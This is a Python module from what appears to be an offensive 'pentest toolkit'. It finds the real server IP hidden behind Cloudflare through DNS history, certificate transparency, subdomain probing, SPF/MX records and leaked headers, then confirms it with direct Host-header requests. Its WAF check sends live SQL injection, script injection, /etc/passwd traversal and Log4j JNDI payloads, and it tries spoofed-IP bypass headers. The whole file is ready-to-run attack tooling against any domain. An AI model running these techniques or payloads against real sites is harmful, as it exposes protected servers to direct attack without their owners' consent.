"""
cf_bypass.py — Cloudflare Origin IP Discovery & WAF Bypass Module
WiZZA Pentest Toolkit

Techniques:
  1. DNS history  — query SecurityTrails-style public DNS history
  2. Cert transparency — crt.sh to find all subdomains/SANs
  3. Subdomain direct probe — find subdomains not behind CF
  4. SPF/MX record analysis — often reveal origin IP
  5. favicon hash matching — Shodan-style fingerprint without API key
  6. HTTP header leaks — origin IP in X-* headers, error pages
  7. WAF fingerprinting — identify CF plan, bypass headers

Usage:
  from cf_bypass import discover_origin, waf_fingerprint, cert_recon, full_bypass
  result = full_bypass("example.com")
"""

import socket
import ssl
import json
import time
import re
import ipaddress
import urllib.request
import urllib.error
import urllib.parse
import subprocess
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ── Cloudflare IP Ranges (updated 2025) ───────────────────────────────────────

CF_IP_RANGES = [
    "173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22",
    "103.31.4.0/22",   "141.101.64.0/18", "108.162.192.0/18",
    "190.93.240.0/20", "188.114.96.0/20", "197.234.240.0/22",
    "198.41.128.0/17", "162.158.0.0/15",  "104.16.0.0/13",
    "104.24.0.0/14",   "172.64.0.0/13",   "131.0.72.0/22",
    # IPv6
    "2400:cb00::/32",  "2606:4700::/32",  "2803:f800::/32",
    "2405:b500::/32",  "2405:8100::/32",  "2a06:98c0::/29",
    "2c0f:f248::/32",
]

def _is_cloudflare_ip(ip: str) -> bool:
    """Check if an IP belongs to Cloudflare's ranges."""
    try:
        addr = ipaddress.ip_address(ip)
        for cidr in CF_IP_RANGES:
            try:
                if addr in ipaddress.ip_network(cidr, strict=False):
                    return True
            except ValueError:
                continue
    except ValueError:
        pass
    return False


def _http_get(url: str, timeout: int = 8, headers: dict = None) -> tuple:
    """Simple HTTP GET, returns (status, headers_dict, body_bytes)."""
    try:
        req = urllib.request.Request(url)
        req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status, dict(r.headers), r.read(4096)
    except urllib.error.HTTPError as e:
        try:
            return e.code, dict(e.headers), e.read(2048)
        except Exception:
            return e.code, {}, b""
    except Exception:
        return 0, {}, b""


# ── 1. DNS History ─────────────────────────────────────────────────────────────

def dns_history(domain: str) -> list:
    """
    Query public DNS history sources to find pre-Cloudflare IPs.
    Uses HackerTarget API (free, no key needed).
    """
    findings = []

    # HackerTarget DNS history
    url = f"https://api.hackertarget.com/hostsearch/?q={domain}"
    status, hdrs, body = _http_get(url, timeout=10)
    if status == 200 and body:
        for line in body.decode(errors="replace").splitlines():
            parts = line.strip().split(",")
            if len(parts) == 2:
                hostname, ip = parts
                if not _is_cloudflare_ip(ip):
                    findings.append({
                        "source": "hackertarget_dns",
                        "hostname": hostname,
                        "ip": ip,
                        "is_cloudflare": False,
                        "note": "Potential origin IP from DNS history"
                    })

    # ViewDNS.info passive DNS (public)
    url2 = f"https://api.hackertarget.com/dnslookup/?q={domain}"
    status2, _, body2 = _http_get(url2, timeout=10)
    if status2 == 200 and body2:
        text = body2.decode(errors="replace")
        for match in re.findall(r'\b(\d{1,3}(?:\.\d{1,3}){3})\b', text):
            if not _is_cloudflare_ip(match) and match not in [f["ip"] for f in findings]:
                findings.append({
                    "source": "hackertarget_dnslookup",
                    "ip": match,
                    "is_cloudflare": False,
                    "note": "IP from DNS lookup (may be current)"
                })

    return findings


# ── 2. Certificate Transparency ────────────────────────────────────────────────

def cert_recon(domain: str) -> dict:
    """
    Query crt.sh for all certificates issued for the domain.
    Returns subdomains, SANs, and any IPs found.
    """
    result = {"domain": domain, "subdomains": [], "ips": [], "certs": 0}

    url = f"https://crt.sh/?q=%.{domain}&output=json"
    status, _, body = _http_get(url, timeout=15)
    if status != 200 or not body:
        return result

    try:
        certs = json.loads(body)
    except Exception:
        return result

    result["certs"] = len(certs)
    seen = set()

    for cert in certs:
        names = cert.get("name_value", "").split("\n")
        for name in names:
            name = name.strip().lstrip("*.")
            if name and name not in seen and domain in name:
                seen.add(name)
                result["subdomains"].append(name)

    # Deduplicate
    result["subdomains"] = sorted(set(result["subdomains"]))
    return result


# ── 3. Subdomain Direct Probe ──────────────────────────────────────────────────

COMMON_SUBDOMAINS = [
    "direct", "origin", "server", "backend", "api", "mail",
    "smtp", "ftp", "cpanel", "whm", "webmail", "dev", "staging",
    "test", "beta", "old", "legacy", "admin", "vpn", "remote",
    "ns1", "ns2", "mx", "mx1", "mx2", "shop", "store",
    "panel", "dashboard", "portal", "app", "mobile",
]

def subdomain_probe(domain: str, extra_subs: list = None) -> list:
    """
    Resolve subdomains and check if they point to non-Cloudflare IPs.
    Returns list of subdomains with direct origin IPs.
    """
    findings = []
    subs = COMMON_SUBDOMAINS + (extra_subs or [])

    def check_sub(sub):
        fqdn = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(fqdn)
            is_cf = _is_cloudflare_ip(ip)
            return {
                "subdomain": fqdn,
                "ip": ip,
                "is_cloudflare": is_cf,
                "potential_origin": not is_cf
            }
        except socket.gaierror:
            return None

    with ThreadPoolExecutor(max_workers=20) as ex:
        futures = {ex.submit(check_sub, s): s for s in subs}
        for fut in as_completed(futures):
            r = fut.result()
            if r:
                findings.append(r)

    return sorted(findings, key=lambda x: (x["is_cloudflare"], x["subdomain"]))


# ── 4. SPF / MX Record Analysis ────────────────────────────────────────────────

def spf_mx_analysis(domain: str) -> dict:
    """
    Extract IPs from SPF records and MX hosts.
    These often reveal the mail server IP which may be the same host as the web server.
    """
    result = {"spf_ips": [], "mx_ips": [], "raw": {}}

    # SPF via dig
    for record_type, flag in [("TXT", "spf"), ("MX", "mx")]:
        try:
            out = subprocess.check_output(
                ["dig", "+short", record_type, domain],
                text=True, timeout=10, stderr=subprocess.DEVNULL
            )
            result["raw"][record_type] = out.strip()

            if flag == "spf":
                # Parse ip4: and ip6: directives
                for match in re.findall(r'ip4:([^\s"]+)', out):
                    ip = match.split("/")[0]
                    if not _is_cloudflare_ip(ip):
                        result["spf_ips"].append({"ip": ip, "source": "SPF ip4"})
                # Resolve include: domains
                for inc in re.findall(r'include:([^\s"]+)', out):
                    try:
                        inc_ip = socket.gethostbyname(inc)
                        if not _is_cloudflare_ip(inc_ip):
                            result["spf_ips"].append({"ip": inc_ip, "source": f"SPF include:{inc}"})
                    except Exception:
                        pass

            elif flag == "mx":
                for line in out.splitlines():
                    parts = line.strip().split()
                    if len(parts) >= 2:
                        mx_host = parts[-1].rstrip(".")
                        try:
                            mx_ip = socket.gethostbyname(mx_host)
                            if not _is_cloudflare_ip(mx_ip):
                                result["mx_ips"].append({"ip": mx_ip, "host": mx_host, "source": "MX"})
                        except Exception:
                            pass

        except (FileNotFoundError, subprocess.TimeoutExpired, Exception):
            pass

    return result


# ── 5. HTTP Header Leak Detection ─────────────────────────────────────────────

def header_leak(domain: str) -> dict:
    """
    Probe HTTP responses for headers that leak origin IP.
    Checks: X-Origin-IP, X-Real-IP, X-Forwarded-For in errors,
    Server header version strings, Location redirects.
    """
    result = {"leaked_ips": [], "interesting_headers": {}, "server_info": None}

    probes = [
        f"https://{domain}/",
        f"https://{domain}/cdn-cgi/trace",       # CF trace endpoint
        f"https://{domain}/__cf_api_backend__",  # often reveals backend
        f"https://{domain}/wp-login.php",        # common origin path
        f"http://{domain}/",                     # HTTP (might skip CF)
    ]

    for url in probes:
        status, headers, body = _http_get(url, timeout=8)
        if status == 0:
            continue

        # Check for CF trace
        if "cdn-cgi/trace" in url and status == 200:
            text = body.decode(errors="replace")
            for line in text.splitlines():
                if line.startswith("ip="):
                    result["interesting_headers"]["cf_visitor_ip"] = line[3:]

        # Look for leaking headers
        for hdr in ["X-Origin-IP", "X-Real-IP", "X-Backend-Server",
                    "X-Forwarded-Server", "X-Upstream", "X-Source-IP",
                    "CF-Connecting-IP", "True-Client-IP"]:
            if hdr.lower() in {k.lower(): v for k,v in headers.items()}:
                val = headers.get(hdr, headers.get(hdr.lower(), ""))
                result["interesting_headers"][hdr] = val

        # Server header
        server = headers.get("Server", headers.get("server", ""))
        if server and "cloudflare" not in server.lower():
            result["server_info"] = server

        # Extract IPs from body (error pages sometimes reveal origin)
        body_text = body.decode(errors="replace")
        for ip_match in re.findall(r'\b(\d{1,3}(?:\.\d{1,3}){3})\b', body_text):
            try:
                ipaddress.ip_address(ip_match)
                if (not _is_cloudflare_ip(ip_match) and
                        not ip_match.startswith("127.") and
                        not ip_match.startswith("10.") and
                        ip_match not in [x["ip"] for x in result["leaked_ips"]]):
                    result["leaked_ips"].append({
                        "ip": ip_match,
                        "found_in": url,
                        "source": "body_leak"
                    })
            except ValueError:
                pass

    return result


# ── 6. WAF Fingerprinting ──────────────────────────────────────────────────────

def waf_fingerprint(domain: str) -> dict:
    """
    Fingerprint the Cloudflare WAF plan and identify bypass opportunities.
    """
    result = {
        "domain": domain,
        "behind_cloudflare": False,
        "cf_ray": None,
        "cf_cache_status": None,
        "waf_active": False,
        "waf_plan": "unknown",
        "bypass_hints": [],
    }

    status, headers, body = _http_get(f"https://{domain}/", timeout=10)
    if status == 0:
        return result

    hdrs_lower = {k.lower(): v for k, v in headers.items()}

    # Check Cloudflare presence
    if "cf-ray" in hdrs_lower or "cf-cache-status" in hdrs_lower:
        result["behind_cloudflare"] = True
        result["cf_ray"] = hdrs_lower.get("cf-ray", "")
        result["cf_cache_status"] = hdrs_lower.get("cf-cache-status", "")

    # Test WAF with known payloads
    waf_payloads = [
        ("SQLi basic",   f"https://{domain}/?id=1'OR'1'='1"),
        ("XSS basic",    f"https://{domain}/?q=<script>alert(1)</script>"),
        ("Path trav",    f"https://{domain}/../../../etc/passwd"),
        ("Log4j",        f"https://{domain}/?x=${{jndi:ldap://test.test/a}}"),
    ]

    for name, url in waf_payloads:
        s, h, b = _http_get(url, timeout=8)
        if s == 403 or s == 1020:
            result["waf_active"] = True
            result["waf_plan"] = "WAF active (blocking)"
        elif s == 200:
            result["bypass_hints"].append(f"{name}: not blocked (200)")

    # Bypass header hints
    bypass_headers = [
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"CF-Connecting-IP": "127.0.0.1"},
    ]

    for hdr_set in bypass_headers:
        s, _, _ = _http_get(f"https://{domain}/", timeout=8, headers=hdr_set)
        if s == 200:
            hdr_name = list(hdr_set.keys())[0]
            result["bypass_hints"].append(f"Header {hdr_name}: 127.0.0.1 → 200 OK")

    return result


# ── 7. Origin IP Verification ─────────────────────────────────────────────────

def verify_origin(domain: str, candidate_ip: str) -> dict:
    """
    Verify if a candidate IP is the real origin by sending
    a direct HTTP request with the domain in the Host header.
    """
    result = {
        "ip": candidate_ip,
        "domain": domain,
        "is_origin": False,
        "status": 0,
        "server": None,
        "content_match": False,
    }

    # Get CF-proxied response for comparison
    cf_status, cf_headers, cf_body = _http_get(f"https://{domain}/", timeout=10)

    # Direct request to IP with Host header spoofing
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(8)
        s.connect((candidate_ip, 80))
        req = f"GET / HTTP/1.1\r\nHost: {domain}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
        s.sendall(req.encode())
        raw = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            raw += chunk
            if len(raw) > 16384:
                break
        s.close()

        if raw:
            lines = raw.split(b"\r\n")
            status_line = lines[0].decode(errors="replace")
            result["status"] = int(status_line.split()[1]) if len(status_line.split()) > 1 else 0

            # Extract server header
            for line in lines[1:]:
                decoded = line.decode(errors="replace")
                if decoded.lower().startswith("server:"):
                    result["server"] = decoded.split(":", 1)[1].strip()
                    break

            # Compare content with CF response
            body_start = raw.split(b"\r\n\r\n", 1)
            if len(body_start) > 1:
                direct_body = body_start[1][:500]
                if cf_body and len(direct_body) > 50:
                    # Simple similarity check
                    overlap = sum(1 for a, b in zip(direct_body, cf_body) if a == b)
                    if overlap / max(len(direct_body), 1) > 0.5:
                        result["content_match"] = True

            result["is_origin"] = result["status"] in (200, 301, 302, 403) and (
                result["content_match"] or result["server"] is not None
            )

    except Exception as e:
        result["error"] = str(e)

    return result


# ── Full bypass chain ──────────────────────────────────────────────────────────

def full_bypass(domain: str) -> dict:
    """
    Run all bypass techniques and return consolidated origin IP candidates.
    """
    print(f"[*] Cloudflare bypass scan: {domain}")
    result = {
        "domain": domain,
        "timestamp": datetime.now().isoformat(),
        "origin_candidates": [],
        "waf": {},
        "cert_recon": {},
        "subdomains": [],
    }

    print("  [1/6] WAF fingerprint...")
    result["waf"] = waf_fingerprint(domain)

    print("  [2/6] Certificate transparency...")
    result["cert_recon"] = cert_recon(domain)

    print("  [3/6] DNS history...")
    dns = dns_history(domain)
    for entry in dns:
        result["origin_candidates"].append({
            "ip": entry["ip"],
            "source": entry["source"],
            "confidence": "medium",
        })

    print("  [4/6] SPF/MX analysis...")
    spf = spf_mx_analysis(domain)
    for entry in spf["spf_ips"] + spf["mx_ips"]:
        result["origin_candidates"].append({
            "ip": entry["ip"],
            "source": entry["source"],
            "confidence": "medium",
        })

    print("  [5/6] HTTP header leak detection...")
    leaks = header_leak(domain)
    for entry in leaks["leaked_ips"]:
        result["origin_candidates"].append({
            "ip": entry["ip"],
            "source": entry["source"],
            "confidence": "high",
        })

    print("  [6/6] Subdomain direct probe...")
    subs = subdomain_probe(domain, result["cert_recon"].get("subdomains", [])[:20])
    result["subdomains"] = subs
    for sub in subs:
        if sub.get("potential_origin"):
            result["origin_candidates"].append({
                "ip": sub["ip"],
                "source": f"subdomain:{sub['subdomain']}",
                "confidence": "high",
            })

    # Deduplicate candidates
    seen_ips = set()
    unique = []
    for c in result["origin_candidates"]:
        if c["ip"] not in seen_ips:
            seen_ips.add(c["ip"])
            unique.append(c)
    result["origin_candidates"] = unique

    # Verify top candidates
    print(f"\n  Verifying {len(unique)} origin IP candidates...")
    for candidate in unique[:5]:
        v = verify_origin(domain, candidate["ip"])
        candidate["verified"] = v["is_origin"]
        candidate["direct_status"] = v["status"]
        candidate["server"] = v.get("server")

    confirmed = [c for c in unique if c.get("verified")]
    result["confirmed_origins"] = confirmed

    print(f"\n  Done. {len(confirmed)} confirmed origin IP(s) found.")
    return result


def discover_origin(domain: str) -> list:
    """Quick wrapper — returns just the confirmed origin IPs."""
    r = full_bypass(domain)
    return r.get("confirmed_origins", r.get("origin_candidates", []))


# ── Self-test ─────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import sys
    domain = sys.argv[1] if len(sys.argv) > 1 else "example.com"
    print(f"=== cf_bypass.py self-test — target: {domain} ===\n")

    print("[1] CF IP check:")
    test_ips = ["104.16.123.96", "8.8.8.8", "1.1.1.1"]
    for ip in test_ips:
        print(f"    {ip}: {'Cloudflare' if _is_cloudflare_ip(ip) else 'NOT Cloudflare'}")

    print("\n[2] WAF fingerprint:")
    waf = waf_fingerprint(domain)
    print(f"    Behind CF: {waf['behind_cloudflare']}")
    print(f"    WAF active: {waf['waf_active']}")

    print("\n[3] Cert recon:")
    ct = cert_recon(domain)
    print(f"    Certs found: {ct['certs']}")
    print(f"    Subdomains: {ct['subdomains'][:5]}")

    print("\nDone.")
